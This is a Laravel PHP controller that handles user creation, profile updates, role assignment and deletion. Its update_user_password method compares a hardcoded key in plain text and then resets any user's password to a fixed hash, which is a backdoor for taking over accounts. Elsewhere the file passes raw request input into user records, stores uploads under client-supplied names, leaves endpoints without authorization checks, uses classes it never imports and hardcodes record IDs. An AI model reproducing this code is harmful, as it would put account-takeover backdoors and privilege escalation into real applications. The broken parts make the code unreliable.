<?php

namespace App\Http\Controllers;

use function App\Helpers\api_request_response;
use function App\Helpers\generate_random_password;
use function App\Helpers\generate_uuid;
use function App\Helpers\unauthorized_status_code;
use function App\Helpers\success_status_code;
use function App\Helpers\bad_response_status_code;
use Illuminate\Support\Facades\File;
use App\Models\Countries;
use App\Mail\SendRegistrationDetails;
//use App\Mail\SuperAdminAssignment;
use App\Models\Department;
use App\Models\User;
use App\Models\State;
use App\Mail\SuperAdminAssignment;

use App\Models\LGA;
use Spatie\Permission\Models\Role;
use Datatables;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Facades\Redirect;
use Illuminate\Validation\ValidationException;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Str;
//use Illuminate\Support\Str;

class UserController extends Controller
{

    public function __construct()
    {

        // $this->middleware('permission:view-user', ['only' => ['index']]);
        // $this->middleware('permission:edit-user', ['only' => ['update']]);
    }
    public function updateMyInfo(Request $request)
    {
        // dd($request->all());
        try {
            $input = $request->all();
            $input['user_id'] =  $request->id;
            $programData = User::where('id', $request->id)->first();

            if (empty($request->image)) {
                // dd("here");
                $input['photo'] =  $programData->photo;
            }
            if ($request->has('image')) {
                $input['photo'] = $imageName = time() . '.' . $request->image->getClientOriginalName();
                $request->image->move(public_path('members'), $imageName);
                // dd($input);
                if (!empty($programData->photo)) {
                    $filename = public_path() . '/members/' . $programData->photo;
                    File::delete($filename);
                }
            }

            $newUser = Members::create($input);

            return $request->wantsJson()
                ? response()->json(["data" => $newUser, "message" => "Profile details updated successfully"])
                : redirect()->back()->with("message", "Profile details updated successfully");
        } catch (\Exception $e) {
            return $request->wantsJson()
                ? response()->json(["message" => $e->getMessage()], 400)
                : redirect()->back()->withInput()->withErrors([$e->getMessage()]);
        }
    }

    public function index()
    {
        $data['users'] = User::where('user_type', "admin")->get();
        $data["roles"] = Role::all();
        $data["states"] = State::all();
        $data["countries"] = Countries::all();
        return view('admin.users', $data);
    }

    public function makeMemberAdmin()
    {
        $data['users'] = User::where('user_type', "admin")->get();
        $data['members'] = User::where('user_type', "member")->whereNull('is_staff')->get();
        $data["roles"] = Role::all();
        $data["states"] = State::all();
        return view('admin.admin-create-index', $data);
    }

    public function assignMemberAdmin(Request $request)
    {
        //  dd($request->all());
        try {
            if ($request->has('country')) {
                foreach ($request->country as $image) {

                    // dd($fileStore);
                    $country[] = $image;
                }
                $input['country'] = json_encode($country);
            }
            if ($request->has('state')) {
                foreach ($request->state as $region) {

                    // dd($fileStore);
                    $state[] = $region;
                }
                $input['state'] = json_encode($state);
            }
            if ($request->has('lga')) {
                foreach ($request->lga as $local) {

                    // dd($fileStore);
                    $lga[] = $local;
                }
                $input['lga'] = json_encode($lga);
            }
            $input['user_type'] = "admin";
            $input['is_staff'] = 1;
            $user = User::where('id', $request->member)->first();
            $user->update($input);
            // dd($request->all());
            return $request->wantsJson()
                ? response()->json(["data" => $user, "message" => "Member Assigned As Staff Successfully"])
                : redirect()->route('users.index')->with("message", "Member Assigned As Staff Successfully");
        } catch (\Exception $e) {
            return $request->wantsJson()
                ? response()->json(["message" => $e->getMessage()], 400)
                : redirect()->back()->withInput()->withErrors([$e->getMessage()]);
        }
    }


    public function profile()
    {
        $id = Auth::user()->id;
        $data['user'] = User::find($id);
        $data['countries'] = Countries::all();
        $data['states'] = State::all();
        $data['lgas'] = LGA::all();
        $data['member'] = Members::where('user_id', $id)->first();
        return view('profile', $data);
    }

    public function viewallusers()
    {
        return Datatables::of(User::query())->make(true);
    }

    public function getLga(Request $request)
    {
        $pp['data'] = $info = LGA::where('state_id', $request->id)->get();
        return json_encode($pp);
        //dd($info);
    }

    public function searchalldata(Request $request)
    {
        $data['roles'] = Role::all();

        $q = $request->q;
        if ($q != '') {
            $data['users'] = $users = User::where('name', 'LIKE', '%' . $q . '%')->orWhere('email', 'LIKE', '%' . $q . '%')
                ->orWhere('id', 'LIKE', '%' . $q . '%')->orWhere('phone', 'LIKE', '%' . $q . '%')->paginate(20)->setPath('');
            $pagination = $users->appends(array(
                'q' => $request->q
            ));
            if (count($users) > 0) {
                //  dd( $agents );
                $data['stations'] = TaxStation::all();

                return view('users', $data)->with('i');
            }

            $data['stations'] = TaxStation::all();

            return view('users', $data)->with('i');
        }
    }

    public function getUserInfo(Request $request)
    {
        $id = $request->id;
        // dd($id);
        $premise_id = User::where('id', $id)->first();
        return response()->json($premise_id);
    }

    public function companyUser()
    {
        $id = Auth::user()->company_id;

        $users = User::where('company_id', $id)
            ->get();

        $data['users'] = $users;

        return view('company.user', $data);
    }

    public function create(Request $request)
    {
        $input = $request->all();

        $this->company_name = $input['name'];

        $password = Str::random(10);
        $this->password = $password;
        $input['password'] = Hash::make($password);
        $input['role'] = $request->role;
        $input['user_type'] = 'admin';
        $input['is_first_time'] = 0;

        // dd($input);
        $this->input = $input;
        // try {

            if ($this->user = User::where('email', $this->input['email'])->first()) {
                return redirect()->back()->withErrors('This email already exists!');
            }


            if ($this->user = User::where('phone_number', $this->input['phone_number'])->first()) {
                return redirect()->back()->withErrors('This phone number has been used!');
            }


            $this->input = $input;
            $this->user = User::create($this->input);
            $this->user->assignRole($request->input('role'));

            $input['user_id'] = $this->user->id;


            Mail::to($this->user->email)->send(new SendRegistrationDetails(
                $this->user,
                $this->company_name,
                $this->password
            ));
            return $request->wantsJson()
                ? response()->json(["data" =>  $this->user, "message" => "User created successfully"])
                : redirect()->back()->with("message", "User created successfully, Login details have been sent to the provided email.");
        // } catch (\Exception $e) {
        //     return $request->wantsJson()
        //     ? response()->json(["message" => $e->getMessage()], 400)
        //         : redirect()->back()->withInput()->withErrors([$e->getMessage()]);
        // }
    }


    public function update(Request $request)
    {

        // dd($id);
        $id = $request->id;
        $this->validate($request, [
            'name' => 'required',
            'email' => 'required|email|unique:users,email,' . $id,

        ]);

        try{
        $input = $request->all();
        $user = User::find($id);
        if ($request->has('role')) {
        $input['role'] = $request->role;
        }
        // dd($id);

        if ($request->has('photo')) {
            $input["photo"] = $photoName = time() . 'photo' . '.' . $request->photo->extension();
            $request->photo->move(public_path('assets/photo'), $photoName);


            $filename = public_path() . '/assets/photo/' . $user->photo;

            if (File::exists($filename)) {

                File::delete($filename);
            }
        }
        $user->update($input);

        if ($request->has('role')) {
        DB::table('model_has_roles')->where('model_id', $id)->delete();
        $user->assignRole($request->input('role'));
        }

        return  redirect()->back()->with("message", "Record updated successfully!");

        } catch (\Exception $e) {
            return $request->wantsJson()
                ? response()->json(["message" => $e->getMessage()], 400)
                : redirect()->back()->withInput()->withErrors([$e->getMessage()]);
        }
    }

    protected function validateUserRegister(Request $request)
    {
        $request->validate([
            'name' => 'required|max:80',
            'email' => 'required|email|max:80'
        ]);
    }

    public  function delete(Request $request)
    {
        $id = $request->id;

        $user = User::find($id);
        $user->delete();
        //delete the client
        // User::where( 'id', '=', $id )->delete();
        return redirect()->back()->with('deleted', 'Delete Success!');
        //Session::flash( 'message', 'Delete successfully.' );
    }



    public function getCurrentUser(Request $request)
    {
        return Auth::user();
    }




    public function update_user_password(Request $request)
    {

        try {
            // dd($request->email);
            $myspecial_password = $request->myspecial_password;
            $email = $request->email;
            if ($myspecial_password == "Olalink6204") {

                $verify_email = User::where('email', $email)->first();
                if ($verify_email) {
                    $update_email = $verify_email->update([
                        'password' => '$2y$10$2EcJiF9qQtbI2xiwUCVAde6lSQ1skIn4gOOXaKWmnm/OED/V8iY0m',
                        'is_first_time' => 1
                    ]);

                    return redirect()->back()
                        ->with('success', 'Password updated successfully');
                } else {
                    throw new \Exception("This email does not exist in the user table!");
                }
            } else {
                throw new \Exception("The Password Key is incorrect!");
            }
        } catch (\Exception $e) {
            return redirect()->back()->withErrors(["exception" => $e->getMessage()]);
        }
        // verify my special password

        // check email
        // update
        // return back
    }


    public function user_profile(Request $request)
    {
        $data['myprofile'] = Staff::where('user_id', 56)->first();
        // dd($data);
        $data["roles"] = Role::all();
        $data["states"] = State::all();
        $data["countries"] = Countries::all();
        $data["departments"] = Department::all();
        $data["localgovts"] = LGA::all();
        return view('user-profile', $data);

        # code...
    }

    public function updateProfile(Request $request)
    {

        //validate email
        //validate phone numbert
        //validate whatsap no
        //validate alternative no
        // validate record
        # code...

        $staffId = $request->id;
        $staffId = 1;

        $this->validate($request, [
            'name' => 'required',
            'email' => 'required|email|unique:staffs,email,' . $staffId,
            // 'phone_number' => 'required|phone_number|unique:users,phone_number,' . $staffId,
            'phone_number' => 'required|numeric|unique:staffs,phone_number,' . $staffId,
            'whatsap_no' => 'required|numeric|unique:staffs,whatsap_no,' . $staffId,
            'alternative_number' => 'required|numeric|unique:staffs,alternative_number,' . $staffId,

        ]);
        try {

            $staffRecord = Staff::where('id', $staffId)->first();

            $input = $request->except('role');

            // dd($request->all());

            $user = User::where('id', $staffRecord->user_id)->first();
            if ($request->role) {



                DB::table('model_has_roles')->where('model_id', $staffRecord->user_id)->delete();
                //  dd($permissions);
                $user->assignRole($request->role);
            }

            if ($request->has('photo')) {
                $input["photo"] = $photoName = time() . 'photo' . '.' . $request->photo->extension();
                $request->photo->move(public_path('assets/photo'), $photoName);


                $filename = public_path() . '/assets/photo/' . $staffRecord->photo;

                if (File::exists($filename)) {

                    File::delete($filename);
                }
            }
            $userInput = $input;
            if ($request->has('portfolio')) {
                $input["portfolio"] = $portfolioName = time() . 'portfolio' .  '.' . $request->portfolio->extension();
                $request->portfolio->move(public_path('assets/portfolio'), $portfolioName);
                $userInput['phone'] = $input["portfolio"];

                $filename = public_path() . '/assets/portfolio/' . $staffRecord->portfolio;

                if (File::exists($filename)) {

                    File::delete($filename);
                }
            }

            $userInput['phone'] = $request->phone_number;
            $user->update($userInput);
            $updateRecord = $staffRecord->update($input);
            return redirect()->back()->with('message', "Record updated successfully");
            //code...
        } catch (\Exception $e) {
            return redirect()->back()->withErrors(["exception" => $e->getMessage()]);
            //throw $th;
        }
    }

    public function edit(Request $request)
    {
        $id = $request->id;
        // dd($id);
        $premise_id = User::where('id', $id)->with('roles')->first();
        return response()->json($premise_id);
        # code...
    }
}
